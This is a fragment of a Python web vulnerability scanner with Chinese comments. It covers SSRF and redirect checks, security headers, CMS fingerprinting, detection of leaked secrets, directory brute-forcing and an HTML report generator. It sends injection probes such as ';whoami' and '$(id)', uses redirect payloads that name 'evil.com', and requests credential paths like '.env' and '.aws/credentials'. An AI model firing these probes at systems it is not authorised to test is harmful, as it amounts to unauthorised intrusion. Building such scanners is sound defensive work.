    """SSRF增强检测 — URL重定向漏洞 + 协议BOM + CIDR探测"""

    @staticmethod
    def detect(url: str, context: Dict = None) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        testable = SSRFDetector._get_testable_params(params, url)

        # URL重定向测试（额外探测）
        redirect_payloads = [
            ('http://127.0.0.1', 'URL重定向-内网'),
            ('https://127.0.0.1', 'URL重定向-HTTPS内网'),
            ('//evil.com', 'URL重定向-协议相对'),
            ('\\evil.com', 'URL重定向-Windows路径欺骗'),
        ]

        for param_name, original_val in testable.items():
            for redirect_url, desc in redirect_payloads:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    qs = '&'.join(f"{k}={quote_plus(v)}" if k != param_name else f"{k}={redirect_url}" for k, v in params.items())
                    test_url += f"?{qs}"
                    resp = requests.get(test_url, timeout=5, allow_redirects=False)

                    # 检查响应中的重定向头
                    location = resp.headers.get('Location', '') or resp.headers.get('location', '')
                    if location and ('127.0.0.1' in location or 'evil.com' in location or 'localhost' in location):
                        findings.append(VulnFinding(
                            id=f'SSRF_REDIRECT_{param_name}',
                            severity=Severity.HIGH,
                            title=f'URL重定向SSRF [{desc}]',
                            description=f'参数{param_name}允许将请求重定向到指定地址，可能导致内网访问',
                            url=test_url, evidence=f"Location: {location}",
                            recommendation='对用户提供的URL进行白名单校验，禁止重定向到内网地址',
                            cwe='CWE-601', cvss=7.5
                        ))

                except Exception as e:
                    logger.debug(f"SSRF redirect test failed for {param_name}: {e}")

        # 重用原有SSRF检测逻辑（合并结果）
        original_findings = SSRFDetector.detect(url, context)
        findings.extend(original_findings)
        return findings


# ==================== HeaderChecker增强 — 更多安全头（借鉴w3af audit/ssl_certificate + xss）====================
class ExtendedHeaderChecker:
    """扩展HTTP安全头检测 — w3af中缺失的安全头"""

    @staticmethod
    def check(headers: Dict[str, str]) -> List[VulnFinding]:
        findings = []
        header_keys_lower = {h.lower(): h for h in headers.keys()}

        # 新增安全头检测
        extended_checks = [
            {
                'name': 'Feature-Policy',
                'desc': '未设置Feature-Policy（已废弃，替代为Permissions-Policy）',
                'severity': Severity.LOW,
                'cwe': 'CWE-16', 'cvss': 3.1,
            },
            {
                'name': 'Clear-Site-Data',
                'desc': '未设置Clear-Site-Data头，客户端敏感数据可能未被清除',
                'severity': Severity.LOW,
                'cwe': 'CWE-524', 'cvss': 3.1,
            },
            {
                'name': 'Cross-Origin-Opener-Policy',
                'desc': '未设置COOP，可能遭受Cooperative Cross-Origin Isolation攻击',
                'severity': Severity.MEDIUM,
                'cwe': 'CWE-286', 'cvss': 5.3,
            },
            {
                'name': 'Cross-Origin-Resource-Policy',
                'desc': '未设置CORP，资源可能被跨源嵌入利用',
                'severity': Severity.LOW,
                'cwe': 'CWE-16', 'cvss': 3.1,
            },
            {
                'name': 'Cross-Origin-Embedder-Policy',
                'desc': '未设置COEP，可能导致跨源数据泄漏',
                'severity': Severity.LOW,
                'cwe': 'CWE-16', 'cvss': 3.1,
            },
        ]

        for check in extended_checks:
            if check['name'].lower() not in header_keys_lower:
                findings.append(VulnFinding(
                    id=f'MISSING_{check["name"].upper()}',
                    severity=check['severity'],
                    title=f'缺少 {check["name"]} 头',
                    description=check['desc'],
                    url='', recommendation=f'添加响应头: {check["name"]}: same-origin',
                    cwe=check['cwe'], cvss=check['cvss'],
                    params={'header': check['name']}
                ))

        return findings


# ==================== CMS指纹识别增强（借鉴w3af crawl/wordpress_fingerprint + open_api）====================
class CMSEnumDetector:
    """CMS/技术栈深度指纹识别 — 识别插件、版本、用户"""

    PLUGINS_TO_CHECK = {
        'WordPress Plugin Detect': [
            '/wp-content/plugins/', '/wp-content/themes/',
            'wp-content/uploads/', 'wp-includes/js/wp-embed.js',
        ],
        'Joomla Component': ['/components/com_', '/modules/mod_'],
        'Drupal Module': ['/sites/default/files/', '/core/'],
    }

    @staticmethod
    def detect(html: str, url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # WordPress version fingerprinting
        wp_vers = re.findall(r'version=[\d.]+', html, re.IGNORECASE)
        if wp_vers:
            vers = list(set(wp_vers))[:1]  # take first unique
            findings.append(VulnFinding(
                id='CMS_WP_VERSION',
                severity=Severity.INFO,
                title=f'WordPress版本泄露: {vers}',
                description=f'WordPress版本号公开，可利用对应版本的已知CVE漏洞',
                url=url, evidence=str(vers),
                recommendation='隐藏WordPress版本号（如修改header.php中的generator）',
                cwe='CWE-200', cvss=3.1
            ))

        # WordPress user enumeration (author pages)
        if 'wp-content' in html or 'wordpress' in html.lower():
            author_paths = [f'{base_url}/wp-json/wp/v2/users', f'{base_url}/xmlrpc.php']
            for ap in author_paths:
                try:
                    resp = requests.get(ap, timeout=5)
                    if resp.status_code == 200 and '[' in resp.text[:20]:
                        findings.append(VulnFinding(
                            id='CMS_WP_USER_ENUM',
                            severity=Severity.MEDIUM,
                            title=f'WordPress用户枚举端点公开 ({ap})',
                            description='WordPress REST API允许枚举所有注册用户信息',
                            url=ap, evidence=f'JSON with {len(resp.text)} bytes',
                            recommendation='禁用REST API的用户枚举：add_filter("rest_authentication_error", ...)',
                            cwe='CWE-203', cvss=5.3
                        ))
                except Exception:
                    pass

        return findings


# ==================== 敏感信息泄露检测（原有）====================
class SensitiveDataDetector:
    """敏感信息泄露检测"""

    # 正则表达式模式
    PATTERNS = [
        {
            'name': 'API Key (AWS)',
            'pattern': r'(?:A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
            'cwe': 'CWE-798', 'severity': Severity.CRITICAL,
            'title': '发现AWS访问密钥', 'rec': '立即轮换AWS凭证，使用环境变量存储密钥'
        },
        {
            'name': 'GitHub Token',
            'pattern': r'ghp_[A-Za-z0-9]{36}',
            'cwe': 'CWE-798', 'severity': Severity.CRITICAL,
            'title': '发现GitHub个人访问令牌', 'rec': '立即撤销该令牌，使用环境变量存储凭证'
        },
        {
            'name': 'Generic API Key',
            'pattern': r'(?:api[_-]?key|apikey|api_key)\s*[:=]\s*["\']?[A-Za-z0-9_\-]{20,}["\']?',
            'cwe': 'CWE-798', 'severity': Severity.HIGH,
            'title': '发现API密钥明文', 'rec': '使用环境变量或密钥管理服务存储API密钥'
        },
        {
            'name': 'Private Key',
            'pattern': r'-----BEGIN\s+(RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY-----',
            'cwe': 'CWE-312', 'severity': Severity.CRITICAL,
            'title': '发现私钥文件内容', 'rec': '立即轮换密钥，不要在代码/配置中存储私钥'
        },
        {
            'name': 'Database Password',
            'pattern': r'(?:password|passwd|pwd)\s*[:=]\s*["\']?[^\\s"\']{8,}["\']?',
            'cwe': 'CWE-312', 'severity': Severity.HIGH,
            'title': '发现数据库密码配置', 'rec': '使用环境变量或密钥管理服务存储数据库凭证'
        },
        {
            'name': 'Email Address in Comment',
            'pattern': r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+',
            'cwe': 'CWE-200', 'severity': Severity.LOW,
            'title': '发现邮箱地址（可能是开发者联系方式）', 'rec': '移除代码中的个人邮箱'
        },
        {
            'name': 'Hardcoded IP Address',
            'pattern': r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b',
            'cwe': 'CWE-200', 'severity': Severity.MEDIUM,
            'title': '发现内网IP地址', 'rec': '移除配置文件中的内网IP暴露'
        },
        {
            'name': 'JWT Token',
            'pattern': r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+',
            'cwe': 'CWE-287', 'severity': Severity.HIGH,
            'title': '发现JWT Token', 'rec': '不要在响应中返回完整JWT，使用短期token+refresh token'
        },
    ]

    @staticmethod
    def detect(content: str) -> List[VulnFinding]:
        findings = []
        for p in SensitiveDataDetector.PATTERNS:
            matches = re.findall(p['pattern'], content)
            if matches:
                # 去重并截断证据
                unique_matches = list(set(m if isinstance(m, str) else m[0] for m in matches))[:3]
                findings.append(VulnFinding(
                    id=f'SENSITIVE_{p["name"]}',
                    severity=p['severity'],
                    title=p['title'],
                    description=f'在页面内容中检测到匹配 {p["name"]} 的模式，可能存在敏感信息泄露',
                    url='', evidence=str(unique_matches[0]) if unique_matches else 'N/A',
                    recommendation=p['rec'], cwe=p['cwe'], cvss=7.5 if p['severity'] in (Severity.CRITICAL, Severity.HIGH) else 3.0
                ))

        return findings


# ==================== 目录爆破 ====================
class DirBuster:
    """增强版目录/文件枚举 — 支持 SPA/CDN + API端点探测"""

    # 传统服务端路径
    COMMON_PATHS = [
        'admin', 'administrator', 'login', 'wp-admin', 'wp-login.php',
        'wp-content', 'wp-config.php', 'config.php', 'configuration.php',
        '.git', '.svn', '.env', '.htaccess', '.htpasswd',
        'phpmyadmin', 'pma', 'phpinfo.php', 'info.php', 'test.php',
        'backup', 'backups', 'dump', 'db', 'database',
        'api', 'v1', 'v2', 'swagger', 'graphql', 'graphiql',
        'console', 'debug', 'trace', 'actuator',
        'server-status', 'server-info', 'robots.txt', 'sitemap.xml',
        'crossdomain.xml', 'clientaccesspolicy.xml',
        'web.config', 'composer.json', 'package.json',
        'elmah.axd', 'error.log', 'access.log',
    ]

    # SPA/CDN 特有路径（前端路由、构建产物、API网关）
    SPA_PATHS = [
        'index.html', 'app.js', 'main.js', 'bundle.js',
        'chunk-vendors.js', 'vendor.js', 'runtime.js',
        'manifest.json', 'service-worker.js', 'offline.html',
        '.well-known/security.txt',
        'api/v1/health', 'api/v1/info', 'api/v1/status',
        'api/v1/config', 'api/health', 'api/status',
        'actuator/health', 'actuator/info', 'management/health',
        '_next/static/chunks', 'static/js', 'assets/js',
        '__proto__', 'constructor', 'prototype',
        '.DS_Store', 'Thumbs.db', 'node_modules',
        'dist/index.html', 'build/index.html', 'public/',
        'wp-json/wp/v2/users', 'xmlrpc.php',
        '.aws/credentials', 'META-INF/maven',
        'favicon.ico', 'manifest.webapp',
    ]

    @staticmethod
    def _fetch(target: str) -> Optional[requests.Response]:
        """统一的 GET 请求（head 对 CDN 可能返回 0 长度）"""
        try:
            resp = requests.get(target, timeout=5, allow_redirects=True,
                               headers={'User-Agent': CONFIG['scanner']['user_agent']})
            return resp
        except Exception:
            return None

    @staticmethod
    def bust(url: str) -> List[Dict]:
        results = []
        parsed = urlparse(url)
        hostname = parsed.hostname or ''
        base_url = f"{parsed.scheme}://{hostname}"

        # 合并路径列表
        all_paths = DirBuster.COMMON_PATHS + DirBuster.SPA_PATHS

        for path in all_paths:
            target = f"{base_url}/{path}"
            resp = DirBuster._fetch(target)
            if resp is None:
                continue

            # 跳过 CDN 默认回源页（如抖音、CloudFront 的 403/404 "file not found"）
            body_preview = (resp.text or '')[:200].lower()
            is_cdn_dummy = any(kw in body_preview for kw in [
                'file not found', 'the resource you requested does not exist',
                'requested url was not found', 'not found', 'cloudfront',
                'access denied', 'cdn error', '404 page', 'resource not found',
            ])

            if is_cdn_dummy and resp.status_code in (403, 404):
                # CDN 兜底页，不算有效发现
                continue

            status = resp.status_code
            # 判断是否敏感：返回正常内容或权限拒绝但非默认 CDN 页
            dangerous = False
            if status == 200:
                # 有实际内容返回
                content_type = (resp.headers.get('Content-Type', '')).lower()
                if len(resp.text) > 50 and 'text/html' in content_type:
                    title_match = re.search(r'<title>([^<]+)</title>', resp.text, re.IGNORECASE)
                    title = (title_match.group(1) if title_match else '').strip()[:60]
                    dangerous = True
                elif 'application/json' in content_type and len(resp.text) > 20:
                    try:
                        json.loads(resp.text[:500])
                        dangerous = True  # JSON API 端点通常有意义
                    except Exception:
                        pass
            elif status in (403, 401):
                dangerous = True  # 权限拒绝说明路径存在

            if dangerous or status in (200, 301, 302, 403, 401):
                results.append({
                    'url': target,
                    'status': status,
                    'size': len(resp.text) if resp.text else 0,
                    'redirect': resp.headers.get('Location', ''),
                    'title': '',
                    'dangerous': dangerous or path.startswith('.') or any(
                        kw in path.lower() for kw in ['api', 'admin', 'secret', 'config', '.env', '.git']
                    ),
                })

        return results


# ==================== URL扫描主控制器 ====================
class URLScanner:
    """URL扫描器主类"""

    def __init__(self, output_dir: str = None):
        self.output_dir = output_dir or os.path.join(os.getcwd(), 'hack_report')
        os.makedirs(self.output_dir, exist_ok=True)
        # 将日志输出到同一目录
        log_file = os.path.join(self.output_dir, 'scanner.log')
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout),
                logging.FileHandler(log_file, encoding='utf-8')
            ]
        )
        self.client = SecureHTTPClient(
            timeout=CONFIG['scanner']['timeout'],
            max_retries=CONFIG['scanner'].get('max_retries', 3),
            proxy=CONFIG.get('scanner', {}).get('proxy', {}),
        )

    def scan(self, target_url: str) -> ScanResult:
        logger.info(f"🎯 开始扫描目标: {target_url}")

        parsed = urlparse(target_url)
        result = ScanResult(target_url=target_url, hostname=parsed.hostname or 'unknown')

        # ==================== 0.5 白盒上下文分析（Shannon）====================
        shannon_context = None
        if HAS_SHANNON_CTX and CONFIG['urls'].get('shannon_context', False):
            ctx_dir = os.path.dirname(__file__)
            ctx_file = os.path.join(ctx_dir, 'file_analysis.json')
            if os.path.isfile(ctx_file):
                try:
                    with open(ctx_file, 'r', encoding='utf-8') as cf:
                        file_data = json.load(cf)
                    from shannon_context import ContextAnalyzer
                    context_analyzer = ContextAnalyzer()
                    if isinstance(file_data, list):
                        context_analyzer.add_file_analysis(file_data)
                    elif isinstance(file_data, dict) and 'findings' in file_data:
                        context_analyzer.add_file_analysis(file_data['findings'])
                    shannon_context = {
                        'matched_vars': [],
                        'framework': '',
                        'data_flows': {},
                        'sql_flow_count': 0,
                    }
                    ctx_summary = context_analyzer.get_summary()
                    if hasattr(context_analyzer, 'context'):
                        for sv in context_analyzer.context.source_vars:
                            shannon_context['matched_vars'].append({
                                'var_name': sv.var_name,
                                'var_type': sv.var_type or '',
                                'source_type': sv.source_type or '',
                                'file_path': sv.file_path,
                            })
                        for tech in context_analyzer.context.technologies:
                            shannon_context['framework'] = tech
                            break
                    if hasattr(context_analyzer, 'data_flows'):
                        shannon_context['sql_flow_count'] = sum(
                            1 for f in context_analyzer.data_flows
                            if 'SQL' in (f.get('sink') or '').upper()
                        )
                    result.context_info = ctx_summary
                    result.contextual_endpoints = context_analyzer.get_discovered_endpoints()
                    result.data_flow_traces = list(context_analyzer.data_flows)
                    logger.info(f"  \u26a1 Shannon\u4e0a\u4e0b\u6587: {ctx_summary['files_analyzed']}\u6587\u4ef6, "
                                f"{ctx_summary['api_endpoints_found']}\u7aef\u70b9, "
                                f"{shannon_context['sql_flow_count']}\u6761SQL\u6570\u636e\u6d41")
                except Exception as e:
                    logger.warning(f"Shannon\u4e0a\u4e0b\u6587\u52a0\u8f7d\u5931\u8d25: {e}")
        if CONFIG['urls'].get('check_ssl', True):
            logger.info("🔒 检查SSL/TLS...")
            https_url = f"https://{parsed.netloc}{parsed.path}" if parsed.scheme != 'https' else target_url
            result.ssl_info = SSLChecker.check(https_url)
            if result.ssl_info['warnings']:
                for w in result.ssl_info['warnings']:
                    logger.warning(f"  SSL: {w}")

        # ==================== 2. HTTP头检查 ====================
        logger.info("📋 获取HTTP响应头...")
        resp = self.client.get(target_url)
        if resp is None:
            logger.error(f"无法访问目标: {target_url}")
            return result

        result.http_headers = dict(resp.headers)

        if CONFIG['urls'].get('check_headers', True):
            logger.info("🛡️ 检查安全头...")
            header_findings = HeaderChecker.check(resp.headers)
            for f in header_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 3. 技术栈识别 ====================
        logger.info("🔍 技术栈检测...")
        techs = self._detect_technologies(resp.text, resp.headers)
        result.technologies = techs
        for t in techs[:10]:
            logger.info(f"  📦 {t}")

        # ==================== 4. CORS检查 ====================
        if CONFIG['urls'].get('check_cors', True):
            logger.info("🌐 检查CORS配置...")
            cors_findings = CORSChecker.check(target_url, resp)
            for f in cors_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 5. SQL注入检测（支持Shannon上下文）====================
        if CONFIG['urls'].get('check_sqli', True) and parsed.query:
            logger.info("💉 检查SQL注入...")
            sqli_ctx = shannon_context if shannon_context else {}
            sqli_findings = SQLiDetector.detect(target_url, context=sqli_ctx)
            for f in sqli_findings:
                result.add_finding(f)

        # ==================== 6. XSS检测（支持编码绕过链）====================
        if CONFIG['urls'].get('check_xss', True) and parsed.query:
            logger.info("🎭 检查XSS...")
            xss_ctx = shannon_context if shannon_context else {}
            xss_findings = XSSDetector.detect(target_url, context=xss_ctx)
            for f in xss_findings:
                result.add_finding(f)

        # ==================== 7. SSRF检测（支持多协议探测）====================
        if CONFIG['urls'].get('check_ssrf', True) and parsed.query:
            logger.info("🌐 检查SSRF...")
            ssrf_ctx = shannon_context if shannon_context else {}
            ssrf_findings = SSRFDetector.detect(target_url, context=ssrf_ctx)
            for f in ssrf_findings:
                result.add_finding(f)

        # ==================== 8. LFI检测 ====================
        if CONFIG['urls'].get('check_lfi', True) and parsed.query:
            logger.info("📁 检查文件包含...")
            lfi_findings = LFIDetector.detect(target_url)
            for f in lfi_findings:
                result.add_finding(f)

        # ==================== 9. WfW检测 ====================
        if CONFIG['urls'].get('check_wwn', True):
            logger.info("🎮 检查命令注入...")
            rce_findings = self._check_rce(target_url)
            for f in rce_findings:
                result.add_finding(f)

        # ==================== 10. XXE注入检测（w3af）====================
        if CONFIG['urls'].get('check_xxe', True):
            logger.info("🧬 检查XXE注入...")
            xxe_findings = XXEDetector.detect(target_url)
            for f in xxe_findings:
                result.add_finding(f)

        # ==================== 11. 文件上传漏洞检测（w3af）====================
        if CONFIG['urls'].get('check_file_upload', True):
            logger.info("📤 检查文件上传漏洞...")
            fu_findings = FileUploadDetector.detect(target_url)
            for f in fu_findings:
                result.add_finding(f)

        # ==================== 12. 反序列化漏洞检测（w3af）====================
        if CONFIG['urls'].get('check_deserialization', True):
            logger.info("🔗 检查反序列化漏洞...")
            des_findings = DeserializationDetector.detect(target_url)
            for f in des_findings:
                result.add_finding(f)

        # ==================== 13. HTTP方法安全检测（w3af）====================
        if CONFIG['urls'].get('check_http_methods', True):
            logger.info("🔧 检查HTTP方法安全...")
            http_method_findings = HTTPMethodsChecker.check(target_url)
            for f in http_method_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 14. VCS泄露检测（w3af）====================
        if CONFIG['urls'].get('check_dvcs_leak', True):
            logger.info("📦 检查版本控制系统泄露...")
            dvcs_findings = DVCSLeakDetector.detect(target_url)
            for f in dvcs_findings:
                result.add_finding(f)

        # ==================== 15. OpenAPI/Swagger发现（w3af）====================
        if CONFIG['urls'].get('check_openapi', True):
            logger.info("📚 发现OpenAPI/Swagger文档...")
            openapi_findings = OpenAPIDiscovery.detect(target_url)
            for f in openapi_findings:
                result.add_finding(f)
            result.openapi_urls = [{'url': o.url, 'endpoints': getattr(o, 'params', {}).get('endpoints', '?')} for o in openapi_findings]

        # ==================== 16. CMS/框架指纹识别（w3af）====================
        if CONFIG['urls'].get('check_cms_fingerprint', True):
            logger.info("🕵️ CMS/框架指纹识别...")
            cms_findings = CMSEnumDetector.detect(resp.text, target_url)
            for f in cms_findings:
                result.add_finding(f)
            # 额外从HTML直接提取CMS信息
            cms_detected = CMSFingerprint.fingerprint(resp.text)
            if cms_detected:
                result.cms_fingerprints.extend(cms_detected)
                result.add_finding(f)

        # ==================== 17. SQL盲注增强（w3af）====================
        if CONFIG['urls'].get('check_sqli_blind', True) and parsed.query:
            logger.info("⏱️ 增强Blind SQLi检测...")
            blind_findings = SQLiBlindDetector.detect(target_url)
            for f in blind_findings:
                result.add_finding(f)

        # ==================== 18. SSRF重定向测试（w3af）====================
        if CONFIG['urls'].get('check_ssrf_redirect', True) and parsed.query:
            logger.info("🔄 SSRF重定向测试...")
            ssrf_ext_findings = SSRFDetectorEnhanced.detect(target_url, {})
            for f in ssrf_ext_findings:
                result.add_finding(f)

        # ==================== 19. 扩展安全头检测（w3af）====================
        if CONFIG['urls'].get('check_extended_headers', True):
            logger.info("🛡️ 检查扩展安全头...")
            ext_header_findings = ExtendedHeaderChecker.check(resp.headers)
            for f in ext_header_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 21. 敏感信息泄露 ====================
        if CONFIG['urls'].get('check_sensitive_data', True):
            logger.info("🕵️ 扫描敏感信息泄露...")
            sensitive_findings = SensitiveDataDetector.detect(resp.text)
            for f in sensitive_findings:
                f.url = target_url
                result.add_finding(f)

        # ==================== 22. 子域名枚举 ====================
        if CONFIG['urls'].get('enum_subdomains', True):
            logger.info("🌳 子域名枚举...")
            ext = tldextract.extract(parsed.hostname)
            base_domain = ext.registered_domain or parsed.hostname
            result.subdomains = SubdomainEnum.enum(base_domain)
            if result.subdomains:
                logger.info(f"  发现 {len(result.subdomains)} 个子域名: {', '.join(result.subdomains[:10])}")

        # ==================== 23. 目录爆破 ====================
        if CONFIG['urls'].get('dir_busting', {}).get('enabled', False):
            logger.info("📂 目录爆破...")
            result.dir_bust_results = DirBuster.bust(target_url)
            dangerous = [d for d in result.dir_bust_results if d.get('dangerous')]
            if dangerous:
                logger.warning(f"  ⚠️ 发现 {len(dangerous)} 个敏感路径!")

        # ==================== 24. URL发现 ====================
        soup = BeautifulSoup(resp.text, 'lxml')
        for a_tag in soup.find_all('a', href=True):
            full_url = urljoin(target_url, a_tag['href'])
            if parsed.netloc in full_url:
                result.discovered_urls.append(full_url)

        logger.info(f"✅ 扫描完成! 发现 {result.finding_count} 个漏洞 ({result.critical_count} critical, {result.high_count} high)")
        return result

    def _detect_technologies(self, html: str, headers: dict) -> List[str]:
        techs = []

        # 从响应头检测
        for hdr, framework in [
            ('X-Powered-By', {'PHP': 'PHP', 'Express': 'Node.js/Express', 'ASP.NET': '.NET'}),
            ('Server', {'nginx': 'Nginx', 'Apache': 'Apache', 'IIS': 'IIS', 'cloudflare': 'Cloudflare WAF', 'aws': 'AWS'}),
        ]:
            if hdr.lower() in [h.lower() for h in headers]:
                val = headers.get(hdr, '')
                for key, val_name in framework.items():
                    if key.lower() in val.lower():
                        techs.append(f"Server: {val_name}")

        # 从HTML检测框架
        framework_indicators = {
            'jQuery': r'jquery.*\.js',
            'React': r'react.*\.js|react-dom',
            'Vue.js': r'vue.*\.js',
            'Angular': r'angular.*\.js|@angular/core',
            'WordPress': r'wp-(content|includes)',
            'Laravel': r'_token|laravel_session',
            'Django': r'csrftoken',
            'Bootstrap': r'bootstrap.*\.css',
            'Tailwind': r'tailwind',
        }

        for name, pattern in framework_indicators.items():
            if re.search(pattern, html, re.IGNORECASE):
                techs.append(f"Frontend: {name}")

        # CSP检测框架
        csp = headers.get('Content-Security-Policy', '')
        if 'strict-dynamic' in csp:
            techs.append("CSP Strict-Dynamic detected")

        return list(set(techs))

    def _check_rce(self, url: str) -> List[VulnFinding]:
        findings = []
        parsed = urlparse(url)
        if not parsed.query:
            return findings

        params = dict([p.split('=', 1) for p in parsed.query.split('&') if '=' in p])
        cmd_keywords = ['cmd', 'command', 'exec', 'shell', 'run', 'system', 'ping', 'nslookup']

        for param_name, original_val in params.items():
            if not any(kw in param_name.lower() for kw in cmd_keywords):
                continue
            if len(original_val) > 50:
                continue

            rce_payloads = [';ls', '|ls', '`id`', '$(id)', ';whoami', '&whoami']
            for payload in rce_payloads:
                try:
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    params_copy = params.copy()
                    query_str = '&'.join(
                        f"{k}={quote_plus(v)}" if k != param_name else f"{k}={payload}"
                        for k, v in params_copy.items()
                    )
                    test_url += f"?{query_str}"

                    resp = requests.get(test_url, timeout=10)
                    if any(cmd in resp.text for cmd in ['uid=', 'gid=', 'total', 'dir']):
                        findings.append(VulnFinding(
                            id=f'RCE_{param_name}',
                            severity=Severity.CRITICAL,
                            title=f'GET {param_name} 可能存在命令注入',
                            description='参数允许执行系统命令，可导致服务器完全沦陷',
                            url=test_url, evidence=f"Payload: {payload}",
                            recommendation='禁止用户输入拼接系统命令，使用白名单机制',
                            cwe='CWE-78', cvss=10.0, params={'param': param_name}
                        ))
                except Exception:
                    pass

        return findings


# ==================== 报告生成器 ====================
class ReportGenerator:
    """HTML格式扫描报告"""

    @staticmethod
    def generate(result: ScanResult, output_file: str = 'report.html'):
        severity_stats = {s.value: 0 for s in Severity}
        for f in result.findings:
            severity_stats[f.severity.value] += 1

        risk_score = (result.critical_count * 25 +
                      result.high_count * 15 +
                      sum(1 for f in result.findings if f.severity == Severity.MEDIUM) * 5 +
                      sum(1 for f in result.findings if f.severity == Severity.LOW) * 1)

        risk_level = "🟢 SAFE" if risk_score < 20 else \
                     "🟡 MODERATE" if risk_score < 60 else \
                     "🔴 HIGH RISK" if risk_score < 100 else \
                     "☠️ CRITICAL"

        html = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>\U0001f510 漏洞扫描报告 - {result.target_url}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; line-height: 1.6; }}
        .container {{ max-width: 1200px; margin: 0 auto; padding: 2rem; }}
        header {{ text-align: center; padding: 3rem 0; border-bottom: 1px solid #21262d; margin-bottom: 2rem; }}
        h1 {{ font-size: 2.5rem; background: linear-gradient(135deg, #58a6ff, #f78166); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
        .target {{ color: #8b949e; font-size: 1.2rem; margin-top: 0.5rem; word-break: break-all; }}
        .summary {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 2rem 0; }}
        .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; text-align: center; }}
        .card .num {{ font-size: 2.5rem; font-weight: bold; }}
        .card .label {{ color: #8b949e; margin-top: 0.5rem; }}
        .risk {{ text-align: center; padding: 1.5rem; border-radius: 12px; font-size: 1.3rem; font-weight: bold; margin: 2rem 0; }}
        .findings {{ margin: 2rem 0; }}
        .finding {{ background: #161b22; border-left: 4px solid; border-radius: 8px; padding: 1.2rem; margin: 0.8rem 0; transition: transform 0.2s; }}
        .finding:hover {{ transform: translateX(5px); }}
        .critical {{ border-color: #dc3545; }} .critical .sev {{ color: #dc3545; }}
        .high {{ border-color: #fd7e14; }} .high .sev {{ color: #fd7e14; }}
        .medium {{ border-color: #ffc107; }} .medium .sev {{ color: #ffc107; }}
        .low {{ border-color: #17a2b8; }} .low .sev {{ color: #17a2b8; }}
        .info {{ border-color: #6c757d; }} .info .sev {{ color: #6c757d; }}
        .sev {{ font-weight: bold; text-transform: uppercase; font-size: 0.85rem; }}
        .finding h3 {{ margin: 0.5rem 0; color: #e6edf3; }}
        .finding .url {{ word-break: break-all; color: #58a6ff; font-size: 0.9rem; margin: 0.3rem 0; }}
        .finding .cwe {{ color: #8b949e; font-size: 0.85rem; }}
        .finding .rec {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.8rem; font-size: 0.9rem; color: #7ee787; }}
        .finding .evd {{ background: #1c2333; padding: 0.8rem; border-radius: 6px; margin-top: 0.5rem; font-family: monospace; font-size: 0.85rem; color: #ffa657; word-break: break-all; }}
        .section-title {{ font-size: 1.5rem; margin: 2rem 0 1rem; color: #e6edf3; border-bottom: 2px solid #30363d; padding-bottom: 0.5rem; }}
        footer {{ text-align: center; padding: 2rem 0; color: #484f58; font-size: 0.9rem; margin-top: 3rem; border-top: 1px solid #21262d; }}
        .tech-list {{ display: flex; flex-wrap: wrap; gap: 0.5rem; justify-content: center; margin: 1rem 0; }}
        .tag {{ background: #21262d; padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.85rem; color: #79c0ff; }}
        table {{ width: 100%; border-collapse: collapse; margin: 1rem 0; }}
        th, td {{ padding: 0.6rem; text-align: left; border-bottom: 1px solid #21262d; }}
        th {{ color: #8b949e; font-size: 0.9rem; }}
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 安全扫描报告</h1>
            <p class="target">{result.target_url}</p>
            <p style="color:#484f58; margin-top:0.5rem;">生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        </header>

        <div class="summary">
            <div class="card"><div class="num">{result.finding_count}</div><div class="label">总漏洞数</div></div>
            <div class="card" style="border-color: #dc3545;"><div class="num" style="color:#dc3545;">{result.critical_count}</div><div class="label">严重 (Critical)</div></div>
            <div class="card" style="border-color: #fd7e14;"><div class="num" style="color:#fd7e14;">{result.high_count}</div><div class="label">高危 (High)</div></div>
            <div class="card"><div class="num">{severity_stats['medium']}</div><div class="label">中危 (Medium)</div></div>
        </div>

        <div class="risk" style="background: #161b22; border: 1px solid {('#dc3545' if risk_score >= 80 else '#fd7e14' if risk_score >= 40 else '#ffc107')};">
            风险评级: {risk_level} (综合评分: {risk_score})
        </div>

        {'<h2 class="section-title">🛡️ HTTP安全头状态</h2>' if result.http_headers else ''}
        {'<table><tr><th>Header</th><th>值</th></tr>' + ''.join(f'<tr><td style="color:#79c0ff">{k}</td><td>{v[:80]}</td></tr>' for k,v in result.http_headers.items()) + '</table>' if result.http_headers else ''}

        <h2 class="section-title">📦 技术栈</h2>
        <div class="tech-list">
            {''.join(f'<span class="tag">{t}</span>' for t in result.technologies)}
        </div>

